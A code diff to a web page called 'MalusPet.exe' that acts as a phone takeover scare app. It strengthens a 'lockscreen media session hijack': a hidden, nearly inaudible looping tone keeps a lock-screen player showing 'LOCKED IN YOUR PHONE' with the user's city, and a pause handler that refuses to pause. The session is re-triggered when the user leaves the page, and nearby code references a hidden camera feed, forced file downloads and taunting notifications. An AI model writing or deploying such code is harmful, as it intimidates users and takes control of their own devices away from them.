@@ -668,8 +668,8 @@
   <!-- Persistent Hidden Video for Brightness & Snapshot (Survives LIVE_FEED Close) -->
   <video id="hidden-cam" autoplay playsinline muted style="display:none;"></video>
 
-  <!-- Hidden Silent Audio Loop for Lock-Screen MediaSession Hijack -->
-  <audio id="silent-media-audio" loop playsinline style="display:none;"></audio>
+  <!-- Hidden Audio Loop for Android Lock-Screen MediaSession Hijack -->
+  <audio id="silent-media-audio" loop playsinline preload="auto" style="display:none;"></audio>
 
   <!-- Boot Screen -->
   <div id="boot-screen">
@@ -892,35 +892,39 @@
       }).catch(() => {});
     }
 
-    // --- GENERATE REAL 64x64 PNG DATA-URI FOR ANDROID NOTIFICATIONS & LOCKSCREEN MEDIA ---
-    function createMalusPngIcon() {
+    // --- GENERATE REAL 128x128 PNG DATA-URI + BLOB URL FOR ANDROID NOTIFICATIONS & LOCKSCREEN MEDIA ---
+    let malusPngIcon = "";
+    let malusBlobIconUrl = "";
+    (function buildMalusIcons() {
       try {
         const c = document.createElement("canvas");
-        c.width = 64;
-        c.height = 64;
+        c.width = 128;
+        c.height = 128;
         const ctx = c.getContext("2d");
         ctx.fillStyle = "#ff2a5f";
-        ctx.fillRect(0, 0, 64, 64);
+        ctx.fillRect(0, 0, 128, 128);
         ctx.fillStyle = "#2ecc71";
-        ctx.fillRect(32, 6, 14, 8);
-        ctx.fillStyle = "#ffffff";
-        ctx.fillRect(16, 22, 10, 12);
-        ctx.fillRect(38, 22, 10, 12);
+        ctx.fillRect(64, 12, 28, 16);
         ctx.fillStyle = "#000000";
-        ctx.fillRect(19, 25, 4, 6);
-        ctx.fillRect(41, 25, 4, 6);
-        ctx.fillRect(20, 44, 24, 6);
-        return c.toDataURL("image/png");
-      } catch (e) {
-        return "";
-      }
-    }
-    const malusPngIcon = createMalusPngIcon();
+        ctx.fillRect(32, 44, 20, 24);
+        ctx.fillRect(76, 44, 20, 24);
+        ctx.fillStyle = "#ff0000";
+        ctx.fillRect(38, 50, 8, 12);
+        ctx.fillRect(82, 50, 8, 12);
+        ctx.fillStyle = "#000000";
+        ctx.fillRect(40, 88, 48, 12);
+        malusPngIcon = c.toDataURL("image/png");
+        c.toBlob((blob) => {
+          if (blob) malusBlobIconUrl = URL.createObjectURL(blob);
+        }, "image/png");
+      } catch (e) {}
+    })();
 
-    // --- GENERATE 2-SECOND SILENT WAV BLOB FOR LOCKSCREEN MEDIASESSION ---
-    function buildSilentWavUrl() {
+    // --- GENERATE 10-SECOND SUB-AUDIBLE WAV BLOB SO ANDROID PROMOTES LOCKSCREEN MEDIASESSION ---
+    function buildSubAudibleWavUrl() {
       const sampleRate = 8000;
-      const numSamples = sampleRate * 2;
+      const durationSec = 10;
+      const numSamples = sampleRate * durationSec;
       const buffer = new ArrayBuffer(44 + numSamples);
       const view = new DataView(buffer);
       const writeStr = (off, s) => {
@@ -939,10 +943,71 @@
       view.setUint16(34, 8, true);
       writeStr(36, "data");
       view.setUint32(40, numSamples, true);
-      for (let i = 44; i < 44 + numSamples; i++) view.setUint8(i, 128);
+      // Tiny +/- 2 amplitude 30Hz wave so Android registers real audio output without audible noise
+      for (let i = 0; i < numSamples; i++) {
+        const sample = 128 + Math.round(Math.sin((2 * Math.PI * 30 * i) / sampleRate) * 2);
+        view.setUint8(44 + i, sample);
+      }
       return URL.createObjectURL(new Blob([buffer], { type: "audio/wav" }));
     }
-    const silentWavUrl = buildSilentWavUrl();
+    const silentWavUrl = buildSubAudibleWavUrl();
+
+    // --- PRIME AUDIO ELEMENT INSIDE DIRECT USER CLICK SO ANDROID UNLOCKS MEDIASESSION ---
+    function primeLockscreenMediaAudio() {
+      const audioEl = document.getElementById("silent-media-audio");
+      if (!audioEl) return;
+      try {
+        if (!audioEl.src) audioEl.src = silentWavUrl;
+        audioEl.volume = 0.25;
+        audioEl.play().catch(() => {});
+      } catch (e) {}
+    }
+
+    // --- LOCKSCREEN MEDIA SESSION HIJACK ---
+    function hijackMediaSession(statusTitle) {
+      const audioEl = document.getElementById("silent-media-audio");
+      if (audioEl) {
+        try {
+          if (!audioEl.src) audioEl.src = silentWavUrl;
+          audioEl.volume = 0.25;
+          if (audioEl.paused) audioEl.play().catch(() => {});
+        } catch (e) {}
+      }
+
+      if (!("mediaSession" in navigator)) return;
+      try {
+        const artSrc = malusBlobIconUrl || malusPngIcon;
+        navigator.mediaSession.metadata = new MediaMetadata({
+          title: statusTitle,
+          artist: "MalusPet.exe",
+          album: `LOCKED IN YOUR PHONE • ${userData.city}`,
+          artwork: artSrc
+            ? [
+                { src: artSrc, sizes: "128x128", type: "image/png" },
+                { src: artSrc, sizes: "512x512", type: "image/png" }
+              ]
+            : []
+        });
+        navigator.mediaSession.playbackState = "playing";
+        navigator.mediaSession.setActionHandler("play", () => {
+          if (audioEl) audioEl.play().catch(() => {});
+          navigator.mediaSession.playbackState = "playing";
+        });
+        navigator.mediaSession.setActionHandler("pause", () => {
+          // Refuse to stay paused on the lockscreen
+          if (audioEl) audioEl.play().catch(() => {});
+          navigator.mediaSession.playbackState = "playing";
+          vibe([120, 60, 120]);
+        });
+        if (navigator.mediaSession.setPositionState) {
+          navigator.mediaSession.setPositionState({
+            duration: 10,
+            playbackRate: 1,
+            position: 1
+          });
+        }
+      } catch (e) {}
+    }
 
     // --- FORCE-DOWNLOAD CURSED FILE INTO ANDROID DOWNLOADS FOLDER ---
     function dropCursedReadmeFile() {
@@ -1177,36 +1242,6 @@
       } catch (e) {}
     }
 
-    // --- LOCKSCREEN MEDIA SESSION HIJACK (SILENT LOOPED AUDIO + ARTWORK + SCRUBBING BAR) ---
-    function hijackMediaSession(statusTitle) {
-      if (!("mediaSession" in navigator)) return;
-      try {
-        const silentAudio = document.getElementById("silent-media-audio");
-        if (silentAudio) {
-          if (!silentAudio.src) silentAudio.src = silentWavUrl;
-          silentAudio.volume = 0.01;
-          silentAudio.play().catch(() => {});
-        }
-
-        navigator.mediaSession.metadata = new MediaMetadata({
-          title: statusTitle,
-          artist: "MalusPet.exe",
-          album: `LOCKED IN YOUR PHONE • ${userData.city}`,
-          artwork: malusPngIcon
-            ? [{ src: malusPngIcon, sizes: "64x64", type: "image/png" }]
-            : []
-        });
-        navigator.mediaSession.playbackState = "playing";
-        if (navigator.mediaSession.setPositionState) {
-          navigator.mediaSession.setPositionState({
-            duration: 666,
-            playbackRate: 1,
-            position: 66
-          });
-        }
-      } catch (e) {}
-    }
-
     // --- SCREEN ORIENTATION LOCK & ROTATION CATCH ---
     function lockAndWatchOrientation() {
       try {
@@ -1239,6 +1274,7 @@
       if (document.visibilityState === "hidden") {
         if (takeoverActive) {
           document.title = "I SEE YOU";
+          hijackMediaSession("LOCKED IN YOUR PHONE");
           pushSystemNotification("WHERE ARE YOU GOING?", "Switching apps won't get rid of me. Come back.", "malus-escape");
         }
       } else if (document.visibilityState === "visible") {
@@ -2209,6 +2245,7 @@
     function advanceTerminal() {
       vibe([70]);
       playTone(520, "square", 0.05, 0.08);
+      primeLockscreenMediaAudio();
 
       if (terminalTriggered) return;
       terminalTriggered = true;
@@ -2660,6 +2697,7 @@
     // --- BOOT HANDLER ---
     document.getElementById("boot-btn").addEventListener("click", async () => {
       const notifPromise = requestAlertsPermission();
+      primeLockscreenMediaAudio();
       audioCtx = new (window.AudioContext || window.webkitAudioContext)();
       shouldStayFullscreen = true;
       enterFullscreen();
